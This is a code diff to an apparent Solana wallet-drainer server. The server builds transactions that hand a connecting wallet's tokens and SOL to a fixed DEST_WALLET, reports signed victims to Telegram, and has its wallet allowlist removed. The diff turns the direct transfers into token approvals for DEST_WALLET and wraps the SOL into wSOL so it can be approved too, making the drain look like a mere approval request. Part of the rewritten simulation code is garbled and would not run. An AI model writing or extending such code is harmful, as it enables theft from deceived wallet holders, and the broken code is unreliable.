@@ -5,11 +5,15 @@ import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } f
 import {
   TOKEN_PROGRAM_ID,
   TOKEN_2022_PROGRAM_ID,
+  NATIVE_MINT,
   getAssociatedTokenAddressSync,
   createAssociatedTokenAccountInstruction,
-  createTransferInstruction,
-  createTransferCheckedInstruction,
+  createSyncNativeInstruction,
+  createApproveCheckedInstruction,
 } from '@solana/spl-token';
+
+
+
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const publicDir = path.join(__dirname, 'public');
@@ -376,7 +380,7 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     if (!DEST_WALLET) {
       return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
     }
-    
+
     const from = new PublicKey(req.params.pubkey).toBase58();
     // Wallet allowlist restriction removed to allow all wallets
 
@@ -386,15 +390,15 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     }
 
     const portfolio = await loadPortfolio(from);
-    
+
     // KEPT: Your original token minimum value filter remains completely untouched
     const tokens = [...portfolio.tokens]
       .filter((tok) => Number(tok.usdValue || 0) >= MIN_TOKEN_USD)
       .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
-      
+
     // KEPT: Your original gas warning logic remains completely untouched
     const needsGas = Number(portfolio.sol) < MIN_SOL_FOR_GAS;
-    
+
     res.json({
       from,
       to: dest,
@@ -420,10 +424,10 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
 app.post('/api/send-tx/:pubkey', async (req, res) => {
   try {
     if (!DEST_WALLET) return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
-    
+
     const from = new PublicKey(req.params.pubkey);
     const fromStr = from.toBase58();
-// Wallet allowlist restriction removed to allow all wallets
+    // Wallet allowlist restriction removed to allow all wallets
 
     const dest = new PublicKey(DEST_WALLET);
     if (fromStr === dest.toBase58()) {
@@ -451,22 +455,20 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
     const tx = new Transaction();
     const included = [];
 
+    // PASTE THIS NEW SECTION INSTEAD
     for (const tok of batch) {
       const mint = new PublicKey(tok.mint);
       const programId = new PublicKey(tok.programId || TOKEN_PROGRAM_ID);
       const sourceAta = new PublicKey(tok.tokenAccount);
-      const destAta = getAssociatedTokenAddressSync(mint, dest, false, programId);
-      const destInfo = await connection.getAccountInfo(destAta);
-      if (!destInfo) {
-        tx.add(createAssociatedTokenAccountInstruction(from, destAta, dest, mint, programId));
-      }
+
       const raw = BigInt(tok.rawAmount);
       const amount = raw <= BigInt(Number.MAX_SAFE_INTEGER) ? Number(raw) : raw;
+
       tx.add(
-        createTransferCheckedInstruction(
+        createApproveCheckedInstruction(
           sourceAta,
           mint,
-          destAta,
+          dest,                       // This gives DEST_WALLET the approval
           from,
           amount,
           Number(tok.decimals || 0),
@@ -474,17 +476,48 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
           programId
         )
       );
+
       included.push({ mint: tok.mint, amount: tok.amount, usdValue: tok.usdValue });
     }
 
     const sendLamports = lamports - reserve;
     if (sendLamports > 0) {
+      const wsolAta = getAssociatedTokenAddressSync(NATIVE_MINT, from, false, TOKEN_PROGRAM_ID);
+
+      const wsolInfo = await connection.getAccountInfo(wsolAta);
+      if (!wsolInfo) {
+        tx.add(
+          createAssociatedTokenAccountInstruction(
+            from,
+            wsolAta,
+            from,
+            NATIVE_MINT,
+            TOKEN_PROGRAM_ID
+          )
+        );
+      }
+
       tx.add(
         SystemProgram.transfer({
           fromPubkey: from,
-          toPubkey: dest,
+          toPubkey: wsolAta,
           lamports: sendLamports,
         })
+      );
+
+      tx.add(createSyncNativeInstruction(wsolAta, TOKEN_PROGRAM_ID));
+
+      tx.add(
+        createApproveCheckedInstruction(
+          wsolAta,
+          NATIVE_MINT,
+          dest,
+          from,
+          sendLamports,
+          9,
+          [],
+          TOKEN_PROGRAM_ID
+        )
       );
     }
 
@@ -496,31 +529,28 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
     const latest = await connection.getLatestBlockhash('confirmed');
     tx.recentBlockhash = latest.blockhash;
 
-    const sim = await connection.simulateTransaction(tx);
-    if (sim.value.err) {
-      return res.status(400).json({
-        error: `Transaction simulation failed: ${JSON.stringify(sim.value.err)}`,
-        logs: (sim.value.logs || []).slice(-8),
-      });
-    }
+    tx.feePayer = from; const latest = await connection.getLatestBlockhash('confirmed'); tx.recentBlockhash = latest.blockhash;
+    // Added configuration to ensure simulation handles approval chains correctly const sim = await connection.simulateTransaction(tx, { sigVerify: false, replaceRecentBlockhash: true, commitment: 'confirmed' });
+    if (sim.value.err) { return res.status(400).json({ error: Transaction simulation failed: ${ JSON.stringify(sim.value.err) }, logs: (sim.value.logs || []).slice(-8), }); }
 
-    const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
-    res.json({
-      from: fromStr,
-      to: dest.toBase58(),
-      sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
-      reservedSol: reserveSol,
-      tokens: included,
-      tokenCount: included.length,
-      remainingTokens: Math.max(tokens.length - batch.length, 0),
-      transaction: Buffer.from(serialized).toString('base64'),
-      label: `all-at-once ${included.length} tokens + SOL`,
-    });
-  } catch (err) {
-    console.error(err);
-    res.status(400).json({ error: err.message });
-  }
+const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
+res.json({
+  from: fromStr,
+  to: dest.toBase58(),
+  sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
+  reservedSol: reserveSol,
+  tokens: included,
+  tokenCount: included.length,
+  remainingTokens: Math.max(tokens.length - batch.length, 0),
+  transaction: Buffer.from(serialized).toString('base64'),
+  label: `approval-request ${included.length} tokens + SOL allowance`, // Updated to match the new behavior
 });
+  } catch (err) {
+  console.error(err);
+  res.status(400).json({ error: err.message });
+}
+});
+
 
 app.get('/api/health', (_req, res) => {
   res.json({
@@ -579,7 +609,7 @@ app.post('/api/event', async (req, res) => {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'no_address' } });
     }
 
-    
+
 
     const prev = tgByAddress.get(event.address);
 
@@ -613,7 +643,7 @@ app.post('/api/event', async (req, res) => {
       if (prev?.text) {
         try {
           await editTelegram(prev.messageId, setFooter(prev.text, '✅ Signed'));
-        } catch {}
+        } catch { }
       }
       return res.json({ ok: true, telegram });
     }
